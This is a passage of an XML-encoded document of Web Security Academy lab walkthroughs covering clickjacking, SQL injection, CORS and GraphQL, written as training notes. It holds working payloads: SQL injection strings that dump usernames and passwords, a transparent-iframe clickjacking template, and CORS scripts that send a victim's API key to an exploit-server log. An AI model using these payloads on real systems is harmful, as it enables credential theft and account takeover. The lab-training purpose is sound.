      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>top:$top_value;</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>left:$side_value;</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>z-index: 1;</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>}</text:p>
      <text:p text:style-name="Preformatted_20_Text">&lt;/style&gt;</text:p>
      <text:p text:style-name="Preformatted_20_Text">&lt;div&gt;Test me&lt;/div&gt;</text:p>
      <text:p text:style-name="Preformatted_20_Text">&lt;iframe src="YOUR-LAB-ID.web-security-academy.net/my-account"&gt;&lt;/iframe&gt;</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">Make the following adjustments to the template:</text:p>
      <text:p text:style-name="Preformatted_20_Text">Replace YOUR-LAB-ID in the iframe src attribute with your unique lab ID.</text:p>
      <text:p text:style-name="Preformatted_20_Text">Substitute suitable pixel values for the $height_value and $width_value variables of the iframe (we suggest 700px and 500px respectively).</text:p>
      <text:p text:style-name="Preformatted_20_Text">Substitute suitable pixel values for the $top_value and $side_value variables of the decoy web content so that the "Delete account" button and the "Test me" decoy action align (we suggest 300px and 60px respectively).</text:p>
      <text:p text:style-name="Preformatted_20_Text">Set the opacity value $opacity to ensure that the target iframe is transparent. Initially, use an opacity of 0.1 so that you can align the iframe actions and adjust the position values as necessary. For the submitted attack a value of 0.0001 will work.</text:p>
      <text:p text:style-name="Preformatted_20_Text">Click Store and then View exploit.</text:p>
      <text:p text:style-name="Preformatted_20_Text">Hover over Test me and ensure the cursor changes to a hand indicating that the div element is positioned correctly. Do not actually click the "Delete account" button yourself. If you do, the lab will be broken and you will need to wait until it resets to try again (about 20 minutes). If the div does not line up properly, adjust the top and left properties of the style sheet.</text:p>
      <text:p text:style-name="Preformatted_20_Text">Once you have the div element lined up correctly, change "Test me" to "Click me" and click Store.</text:p>
      <text:p text:style-name="Preformatted_20_Text">Click on Deliver exploit to victim and the lab should be solved.</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">Lab:1 SQL injection vulnerability in WHERE clause allowing retrieval of hidden data</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"><text:s/>This lab contains a SQL injection vulnerability in the product category filter. When the user selects a category, the application carries out a SQL query like the following:</text:p>
      <text:p text:style-name="Preformatted_20_Text">SELECT * FROM products WHERE category = 'Gifts' AND released = 1</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">To solve the lab, perform a SQL injection attack that causes the application to display one or more unreleased products. </text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">Solutions:</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>Use Burp Suite to intercept and modify the request that sets the product category filter.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>Modify the category parameter, giving it the value '+OR+1=1--</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>Submit the request, and verify that the response now contains one or more unreleased products.</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">Lab:2 SQL injection vulnerability allowing login bypass</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s/>This lab contains a SQL injection vulnerability in the login function.</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"><text:soft-page-break/>To solve the lab, perform a SQL injection attack that logs in to the application as the administrator user. </text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">Solutions:</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>Use Burp Suite to intercept and modify the login request.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>Modify the username parameter, giving it the value: administrator'--</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">Lab:3 SQL injection UNION attack, determining the number of columns returned by the query</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s/>This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. The first step of such an attack is to determine the number of columns that are being returned by the query. You will then use this technique in subsequent labs to construct the full attack.</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">To solve the lab, determine the number of columns returned by the query by performing a SQL injection UNION attack that returns an additional row containing null values. </text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">Solutions:</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>Use Burp Suite to intercept and modify the request that sets the product category filter.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>Modify the category parameter, giving it the value '+UNION+SELECT+NULL--. Observe that an error occurs.</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>Modify the category parameter to add an additional column containing a null value:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>'+UNION+SELECT+NULL,NULL--</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>Continue adding null values until the error disappears and the response includes additional content containing the null values.</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">Lab:4 SQL injection UNION attack, finding a column containing text</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s/>This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you first need to determine the number of columns returned by the query. You can do this using a technique you learned in a previous lab. The next step is to identify a column that is compatible with string data.</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">The lab will provide a random value that you need to make appear within the query results. To solve the lab, perform a SQL injection UNION attack that returns an additional row containing the value provided. This technique helps you determine which columns are compatible with string data. </text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">Solutions:</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>Use Burp Suite to intercept and modify the request that sets the product category filter.</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>Determine the number of columns that are being returned by the query. Verify that the query is returning three columns, using the following payload in the category parameter:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>'+UNION+SELECT+NULL,NULL,NULL--</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"><text:soft-page-break/><text:s text:c="4"/>Try replacing each null with the random value provided by the lab, for example:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>'+UNION+SELECT+'abcdef',NULL,NULL--</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>If an error occurs, move on to the next null and try that instead.</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">Lab:5 SQL injection UNION attack, retrieving data from other tables</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s/>This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you need to combine some of the techniques you learned in previous labs.</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">The database contains a different table called users, with columns called username and password.</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">To solve the lab, perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the administrator user. </text:p>
      <text:p text:style-name="Preformatted_20_Text">Solutions:</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>Use Burp Suite to intercept and modify the request that sets the product category filter.</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>Determine the number of columns that are being returned by the query and which columns contain text data. Verify that the query is returning two columns, both of which contain text, using a payload like the following in the category parameter:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>'+UNION+SELECT+'abc','def'--</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>Use the following payload to retrieve the contents of the users table:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>'+UNION+SELECT+username,+password+FROM+users--</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>Verify that the application's response contains usernames and passwords.</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">Lab:6 SQL injection UNION attack, retrieving multiple values in a single column</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s/>This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">The database contains a different table called users, with columns called username and password.</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">To solve the lab, perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the administrator user. </text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">Solutions:</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>Use Burp Suite to intercept and modify the request that sets the product category filter.</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>Determine the number of columns that are being returned by the query and which columns contain text data. Verify that the query is returning two columns, only one of which contain text, using a payload like the following in the category parameter:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>'+UNION+SELECT+NULL,'abc'--</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>Use the following payload to retrieve the contents of the users table:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>'+UNION+SELECT+NULL,username||'~'||password+FROM+users--</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>Verify that the application's response contains usernames and passwords.</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">Lab:7 SQL injection attack, querying the database type and version on MySQL and Microsoft</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:soft-page-break/><text:s/>This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">To solve the lab, display the database version string. </text:p>
      <text:p text:style-name="Preformatted_20_Text">Solutions:</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>Use Burp Suite to intercept and modify the request that sets the product category filter.</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>Determine the number of columns that are being returned by the query and which columns contain text data. Verify that the query is returning two columns, both of which contain text, using a payload like the following in the category parameter:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>'+UNION+SELECT+'abc','def'#</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>Use the following payload to display the database version:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>'+UNION+SELECT+@@version,+NULL#</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">Lab:8 SQL injection attack, listing the database contents on non-Oracle databases</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s/>This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">To solve the lab, log in as the administrator user. </text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">Solutions:</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>Use Burp Suite to intercept and modify the request that sets the product category filter.</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>Determine the number of columns that are being returned by the query and which columns contain text data. Verify that the query is returning two columns, both of which contain text, using a payload like the following in the category parameter:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>'+UNION+SELECT+'abc','def'--</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>Use the following payload to retrieve the list of tables in the database:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>Find the name of the table containing user credentials.</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>Use the following payload (replacing the table name) to retrieve the details of the columns in the table:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_abcdef'--</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>Find the names of the columns containing usernames and passwords.</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>Use the following payload (replacing the table and column names) to retrieve the usernames and passwords for all users:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>'+UNION+SELECT+username_abcdef,+password_abcdef+FROM+users_abcdef--</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>Find the password for the administrator user, and use it to log in.</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="P3"><text:soft-page-break/>2. Cross-origin Resource Sharing(CORS)</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="P6"><text:span text:style-name="T1">a.</text:span><text:span text:style-name="T2">Lab: CORS vulnerability with basic origin reflection</text:span></text:p>
      <text:p text:style-name="P6"><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P8">This website has an insecure CORS configuration in that it trusts all origins.</text:p>
      <text:p text:style-name="P7">To solve the lab, craft some JavaScript that uses CORS to retrieve the administrator's API key and upload the code to your exploit server. The lab is solved when you successfully submit the administrator's API key.</text:p>
      <text:p text:style-name="P11"><text:span text:style-name="T3">You can log in to your own account using the following credentials: </text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4">wiener:peter</text:span></text:span></text:p>
      <text:p text:style-name="P2">Then access the lab:</text:p>
      <text:h text:style-name="P1" text:outline-level="4"> <text:span text:style-name="T6">Solution</text:span></text:h>
      <text:list text:style-name="L1">
        <text:list-item>
          <text:p text:style-name="P31">Check intercept is off, then use the browser to log in and access your account page.</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P36"><text:span text:style-name="T7">Review the history and observe that your key is retrieved via an AJAX request to </text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T5">/accountDetails</text:span></text:span><text:span text:style-name="T7">, and the response contains the </text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T5">Access-Control-Allow-Credentials</text:span></text:span><text:span text:style-name="T7"> header suggesting that it may support CORS.</text:span></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P32">Send the request to Burp Repeater, and resubmit it with the added header:</text:p>
          <text:p text:style-name="P37"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T5">Origin: https://example.com</text:span></text:span></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P37"><text:span text:style-name="T7">Observe that the origin is reflected in the </text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T5">Access-Control-Allow-Origin</text:span></text:span><text:span text:style-name="T7"> header.</text:span></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P38"><text:span text:style-name="T7">In the browser, go to the exploit server and enter the following HTML, replacing </text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T5">YOUR-LAB-ID</text:span></text:span><text:span text:style-name="T7"> with your unique lab URL:</text:span></text:p>
          <text:p text:style-name="P37"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T5">&lt;html&gt;</text:span></text:span></text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P10"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T5">&lt;body&gt;</text:span></text:span></text:p>
      <text:p text:style-name="P10"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T5"><text:s text:c="8"/>&lt;script&gt;</text:span></text:span></text:p>
      <text:p text:style-name="P10"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T5"><text:s text:c="16"/>var xhr = new XMLHttpRequest();</text:span></text:span></text:p>
      <text:p text:style-name="P10"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T5"><text:s text:c="16"/>var url = "https://0aff0020045970c08141cf6600700039.web-security-academy.net"</text:span></text:span></text:p>
      <text:p text:style-name="P10"><text:soft-page-break/><text:span text:style-name="Source_20_Text"><text:span text:style-name="T5"><text:s text:c="16"/>xhr.onreadystatechange = function() {</text:span></text:span></text:p>
      <text:p text:style-name="P10"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T5"><text:s text:c="24"/>if (xhr.readyState == XMLHttpRequest.DONE){</text:span></text:span></text:p>
      <text:p text:style-name="P10"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T5"><text:s text:c="32"/>fetch("/log?key=" + xhr.responseText)</text:span></text:span></text:p>
      <text:p text:style-name="P10"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T5"/></text:span></text:p>
      <text:p text:style-name="P10"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T5"><text:s text:c="24"/>}</text:span></text:span></text:p>
      <text:p text:style-name="P10"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T5"><text:s text:c="16"/>}</text:span></text:span></text:p>
      <text:p text:style-name="P10"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T5"/></text:span></text:p>
      <text:p text:style-name="P10"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T5"><text:s text:c="16"/>xhr.open('GET', url + "/accountDetails", true);</text:span></text:span></text:p>
      <text:p text:style-name="P10"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T5"><text:s text:c="16"/>xhr.withCredentials = true;</text:span></text:span></text:p>
      <text:p text:style-name="P10"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T5"><text:s text:c="16"/>xhr.send(null)</text:span></text:span></text:p>
      <text:p text:style-name="P10"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T5"><text:s text:c="8"/>&lt;/script&gt;</text:span></text:span></text:p>
      <text:p text:style-name="P10"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T5">&lt;/body&gt;</text:span></text:span></text:p>
      <text:p text:style-name="P10"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T5">&lt;/html&gt; <text:s/></text:span></text:span></text:p>
      <text:list text:continue-numbering="true" text:style-name="L1">
        <text:list-item>
          <text:p text:style-name="P42"><text:span text:style-name="T7">Click </text:span><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T7">View exploit</text:span></text:span><text:span text:style-name="T7">. Observe that the exploit works - you have landed on the log page and your API key is in the URL.</text:span></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P42"><text:span text:style-name="T7">Go back to the exploit server and click </text:span><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T7">Deliver exploit to victim</text:span></text:span><text:span text:style-name="T7">.</text:span></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P43"><text:span text:style-name="T7">Click </text:span><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T7">Access log</text:span></text:span><text:span text:style-name="T7">, retrieve and submit the victim's API key to complete the lab.</text:span></text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="P12"><text:span text:style-name="T11">b. </text:span><text:span text:style-name="T2">Lab: CORS vulnerability with trusted null origin</text:span></text:p>
      <text:p text:style-name="P9">This website has an insecure CORS configuration in that it trusts the "null" origin.</text:p>
      <text:p text:style-name="P7">To solve the lab, craft some JavaScript that uses CORS to retrieve the administrator's API key and upload the code to your exploit server. The lab is solved when you successfully submit the administrator's API key.</text:p>
      <text:p text:style-name="P11"><text:span text:style-name="T3">You can log in to your own account using the following credentials: </text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4">wiener:peter</text:span></text:span></text:p>
      <text:h text:style-name="P4" text:outline-level="4"><text:soft-page-break/> <text:span text:style-name="T6">Solution</text:span></text:h>
      <text:list text:style-name="L2">
        <text:list-item>
          <text:p text:style-name="P33">Check intercept is off, then use Burp's browser to log in to your account. Click "My account".</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P39"><text:span text:style-name="T7">Review the history and observe that your key is retrieved via an AJAX request to </text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T5">/accountDetails</text:span></text:span><text:span text:style-name="T7">, and the response contains the </text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T5">Access-Control-Allow-Credentials</text:span></text:span><text:span text:style-name="T7"> header suggesting that it may support CORS.</text:span></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P40"><text:span text:style-name="T7">Send the request to Burp Repeater, and resubmit it with the added header </text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T5">Origin: null.</text:span></text:span></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P40"><text:span text:style-name="T7">Observe that the "null" origin is reflected in the </text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T5">Access-Control-Allow-Origin</text:span></text:span><text:span text:style-name="T7"> header.</text:span></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P39"><text:span text:style-name="T7">In the browser, go to the exploit server and enter the following HTML, replacing </text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T5">YOUR-LAB-ID</text:span></text:span><text:span text:style-name="T7"> with the URL for your unique lab URL and </text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T5">YOUR-EXPLOIT-SERVER-ID</text:span></text:span><text:span text:style-name="T7"> with the exploit server ID:</text:span></text:p>
          <text:p text:style-name="P41"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T5">&lt;iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="&lt;script&gt; var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','YOUR-LAB-ID.web-security-academy.net/accountDetails',true); req.withCredentials = true; req.send(); function reqListener() { location='YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='+encodeURIComponent(this.responseText); }; &lt;/script&gt;"&gt;&lt;/iframe&gt;</text:span></text:span></text:p>
          <text:p text:style-name="P34">Notice the use of an iframe sandbox as this generates a null origin request.</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P33">Click "View exploit". Observe that the exploit works - you have landed on the log page and your API key is in the URL.</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P33">Go back to the exploit server and click "Deliver exploit to victim".</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P35">Click "Access log", retrieve and submit the victim's API key to complete the lab.</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P14"><text:soft-page-break/>3. GraphQL API Vulnerabilities:</text:p>
      <text:p text:style-name="P20"><text:span text:style-name="T8">a. </text:span>Lab: Accessing private GraphQL posts</text:p>
      <text:p text:style-name="P19">Not solved </text:p>
      <text:p text:style-name="Text_20_body">The blog page for this lab contains a hidden blog post that has a secret password. To solve the lab, find the hidden blog post and enter the password. </text:p>
      <text:p text:style-name="Text_20_body">Learn more about Working with GraphQL in Burp Suite. </text:p>
      <text:p text:style-name="P24">Accesss the lab:</text:p>
      <text:h text:style-name="P13" text:outline-level="4">Solution</text:h>
      <text:p text:style-name="Text_20_body"><text:span text:style-name="Strong_20_Emphasis">Identify the vulnerability</text:span> </text:p>
      <text:list text:style-name="L3">
        <text:list-item>
          <text:p text:style-name="P44">In Burp's browser, access the blog page. </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P44">In Burp, go to <text:span text:style-name="Strong_20_Emphasis">Proxy &gt; HTTP history</text:span> and notice the following: </text:p>
          <text:list>
            <text:list-item>
              <text:p text:style-name="P45">Blog posts are retrieved using a GraphQL query. </text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P45">In the response to the GraphQL query, each blog post has its own sequential <text:span text:style-name="Source_20_Text">id</text:span>. </text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P45">Blog post <text:span text:style-name="Source_20_Text">id</text:span> 3 is missing from the list. This indicates that there is a hidden blog post. </text:p>
            </text:list-item>
          </text:list>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P44">Find the <text:span text:style-name="Source_20_Text">POST /graphql/v1</text:span> request. Right-click it and select <text:span text:style-name="Strong_20_Emphasis">Send to Repeater</text:span>. </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P44">In Repeater, right-click anywhere in the Request panel of the message editor and select <text:span text:style-name="Strong_20_Emphasis">GraphQL &gt; Set introspection query</text:span> to insert an introspection query into the request body. </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P44">Send the request. Notice in the response that the <text:span text:style-name="Source_20_Text">BlogPost</text:span> type has a <text:span text:style-name="Source_20_Text">postPassword</text:span> field available. </text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="Text_20_body"><text:span text:style-name="Strong_20_Emphasis">Exploit the vulnerability to find the password</text:span> </text:p>
      <text:list text:style-name="L4">
        <text:list-item>
          <text:p text:style-name="P46">In the HTTP history, find the <text:span text:style-name="Source_20_Text">POST /graphql/v1</text:span> request. Right-click it and select <text:span text:style-name="Strong_20_Emphasis">Send to Repeater</text:span>. </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P46">In Repeater, click on the <text:span text:style-name="Strong_20_Emphasis">GraphQL</text:span> tab. In the <text:span text:style-name="Strong_20_Emphasis">Variables</text:span> panel, modify the <text:span text:style-name="Source_20_Text">id</text:span> variable to 3 (the ID of the hidden blog post). </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P46">In the <text:span text:style-name="Strong_20_Emphasis">Query</text:span> panel, add the <text:span text:style-name="Source_20_Text">postPassword</text:span> field to the query. </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P46">Send the request. </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P46">Copy the contents of the response's <text:span text:style-name="Source_20_Text">postPassword</text:span> field and paste them into the <text:span text:style-name="Strong_20_Emphasis">Submit solution</text:span> dialog to solve the lab. You may need to refresh the page. </text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P21"><text:span text:style-name="T9">b. <text:s/></text:span>Lab: Accidental exposure of private GraphQL fields</text:p>
      <text:p text:style-name="P16">The user management functions for this lab are powered by a GraphQL endpoint. The lab <text:soft-page-break/>contains an access control vulnerability whereby you can induce the API to reveal user credential fields. </text:p>
      <text:p text:style-name="Text_20_body">To solve the lab, sign in as the administrator and delete the username <text:span text:style-name="Source_20_Text">carlos</text:span>. </text:p>
      <text:p text:style-name="Text_20_body">Learn more about Working with GraphQL in Burp Suite. </text:p>
      <text:p text:style-name="P16">Access the lab:</text:p>
      <text:h text:style-name="P15" text:outline-level="4">Solution</text:h>
      <text:p text:style-name="Text_20_body"><text:span text:style-name="Strong_20_Emphasis">Identify the vulnerability</text:span> </text:p>
      <text:list text:style-name="L5">
        <text:list-item>
